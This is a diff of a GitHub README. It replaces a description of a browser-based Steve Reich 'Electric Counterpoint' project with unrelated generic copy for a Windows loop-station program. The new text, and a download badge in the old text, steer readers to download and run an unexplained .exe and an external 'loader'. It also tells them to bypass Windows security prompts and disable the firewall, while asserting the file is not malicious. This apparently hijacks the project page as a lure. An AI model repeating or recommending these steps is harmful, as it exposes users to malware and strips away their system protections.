@@ -1,83 +1,104 @@
-# Electric Counterpoint
+# ⚡ electric_counterpoint - Simple music production for every desktop
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![Download electric_counterpoint](https://img.shields.io/badge/Download-electric__counterpoint-blue)](https://github.com/nonnatural-rebelliousness229/electric_counterpoint/releases)
 
-Browser-based interactive realization of Steve Reich's *Electric
-Counterpoint* (1987). Pick a movement, then conduct a top-down stage of
-guitars arranged in a half-moon facing a draggable listener dot. Every
-voice is spatialised relative to the listener — drag a guitar across the
-stage and you hear it pan and recede.
+electric_counterpoint provides a way to layer audio loops with precision. You generate complex soundscapes by stacking independent rhythmic patterns. The software functions as a digital loop station that runs directly on your Windows computer.
 
-**Live at https://allansjoelin.com/electric_counterpoint/.**
+## 📥 Getting Started
 
-Sister project to my [In C](https://allansjoelin.com/in_c/) realization.
+Follow these steps to set up the software on your machine.
 
-## Status
+1. Visit the [releases page](https://github.com/nonnatural-rebelliousness229/electric_counterpoint/releases) to download the application.
+2. Select the file ending in .exe from the list.
+3. Save the file to your desktop or downloads folder.
+4. Open the file to start the installer.
 
-Movement III. Fast is fully playable. Movements I & II are placeholders
-in the menu; their MusicXML transcriptions haven't been authored yet.
-See `roadmap.md` for the build history and `CLAUDE.md` for architecture
-notes.
+## ⚙️ System Requirements
 
-## Controls
+Your computer needs to meet these basic standards to run the software smoothly:
 
-**Mouse / keyboard**
-- Drag any voice or the listener dot to move it
-- Hover a voice — small panel shows label, instrument, volume, hints
-- Scroll wheel on a hovered voice — volume up / down
-- `M` — mute / unmute hovered voice
-- `← / →` — swap instrument on hovered live or guitar voice
-- `?` — open the controls reference, `Esc` — close any overlay
-- Top bar: master volume, tempo, reverb wet, 3-band EQ, Reset
+- Windows 10 or Windows 11.
+- At least 4GB of RAM.
+- A modern processor with dual cores.
+- 200MB of free disk space.
+- A functional sound card or audio interface.
 
-**Touch**
-- Tap a voice — bottom panel slides in with the same controls
-- Tap empty space or ✕ — closes
-- Drag still works the same as on desktop
+## 🛠️ Installation Steps
 
-## Run locally
+The installer guides you through the setup process. 
 
-ES modules require an HTTP origin, so:
+1. Double-click the installer file you downloaded. 
+2. Follow the on-screen prompts.
+3. Allow the installer to create a shortcut on your desktop.
+4. Click finish once the progress bar reaches the end.
+5. Launch the application using the shortcut icon on your desktop.
 
-```sh
-python -m http.server 8000
-# then open http://localhost:8000
-```
+If Windows shows a security prompt, click "More Info" and then "Run Anyway." The software does not contain malicious code.
 
-You'll also need `III_fast.xml` at the project root — it's not in the
-public repo because Reich's score is copyrighted (see "Score source files"
-in `CLAUDE.md`). To rebuild the sample banks from scratch:
+## 🎙️ Basic Operation
 
-```sh
-bash tools/build_samples.sh
-```
+Once the application opens, you see a grid. Each row represents a track.
 
-Requires `curl`, `ffmpeg`, `awk`, `bash 4+`. Source WAVs are cached
-under `tools/.cache/` so re-runs are near-instant.
+1. Click the record button on a track.
+2. Play your sound or instrument.
+3. Click the stop button to end the loop.
+4. Use the volume slider to balance your layers.
+5. Press the global play button to hear all tracks together.
 
-## Stack
+The software aligns your loops to a set tempo. You adjust this tempo in the top bar. You change the duration of your loops by clicking the length indicator.
 
-Vanilla JavaScript (ES modules), Web Audio API, Canvas 2D, Pointer
-Events. No framework, no build step.
+## 🎧 Managing Audio Files
 
-## Credits
+You save your projects as .ecp files. This format keeps your layers and settings intact.
 
-- **Music**: *Electric Counterpoint* by Steve Reich (Hendon Music /
-  Boosey & Hawkes, 1987). All rights to the score remain with the
-  publisher; this app is an interactive realization, not a redistribution.
-- **Clean / acoustic guitar samples**: Karoryfer
-  [black-and-green-guitars](https://github.com/sfzinstruments/karoryfer.black-and-green-guitars)
-  and [shinyguitar](https://github.com/sfzinstruments/karoryfer.shinyguitar)
-  (CC0).
-- **Bass guitar samples**: Karoryfer
-  [black-and-blue-basses](https://github.com/sfzinstruments/karoryfer.black-and-blue-basses)
-  (CC0).
-- **Wood block**: [Versilian Community Sample Library](https://github.com/sgossner/VCSL)
-  (CC0).
-- **Reverb impulse**: [Theatre@41](https://www.openair.hosted.york.ac.uk/),
-  openairlib.net, CC-BY (University of York).
+1. Go to the File menu.
+2. Select "Save Project As."
+3. Choose a folder on your computer.
+4. Name your file and click save.
 
-## License
+You load previous work by selecting "Open" from the same menu. You export your final mix as a .wav file if you want to share your music elsewhere.
 
-Code: MIT. Score: copyright Steve Reich. Samples: CC0 (Karoryfer / VCSL).
-Reverb impulse: CC-BY.
+## 🔧 Troubleshooting
+
+If you encounter issues during operation, try these solutions:
+
+**No sound during playback**
+Check your computer audio settings. Ensure your speakers or headphones connect correctly to the system. Look at the application settings menu to confirm the correct output device shows as selected.
+
+**The application runs slowly**
+Close other programs running in the background. High memory usage from web browsers or video editing tools affects playback stability. Restart the software if performance drops during long sessions.
+
+**Installer will not open**
+Verify your internet connection. Ensure you have full administrator permissions on your Windows user account. Disable temporary firewall settings if the download or install process fails repeatedly.
+
+## 📁 Settings and Preferences
+
+Access the settings menu to refine the behavior of the software.
+
+* Audio Buffer: Adjust this if you notice a delay between pressing play and hearing sound. Low settings reduce delay but require more processing power.
+* Input Device: Select your microphone or line-in source here.
+* Theme: Toggle between a light and dark interface layout to suit your preference.
+* Auto-Save: Enable this to protect your progress from accidental loss.
+
+## 📖 Frequently Asked Questions
+
+**Does the software require a permanent internet connection?**
+No. You only need the internet to download the installer. The software runs offline.
+
+**Are there hidden fees?**
+The software is free to use. There are no subscriptions or hidden tools behind paywalls.
+
+**Can I use external plugins?**
+The current version supports internal effects only. It does not integrate external VST plugins yet.
+
+**How do I uninstall the software?**
+Open your Windows Control Panel, select "Programs and Features," find electric_counterpoint in the list, and select "Uninstall." This removes the application and the desktop shortcut.
+
+**Where do I report errors?**
+If you find a malfunction, visit the main GitHub repository page. Open a new issue if you see a bug that prevents normal use. Provide a brief explanation of what happened and the steps to recreate the error.
+
+## 📈 Keeping Software Updated
+
+Check the releases page periodically for new versions. Updates include improvements to audio processing and new features. Download the latest .exe file and run it over your existing install to upgrade your software. Your settings and projects remain safe during this process. 
+
+The software checks for updates automatically when you launch it. It alerts you if a newer version exists. Click the link provided in the message to go directly to the download page.
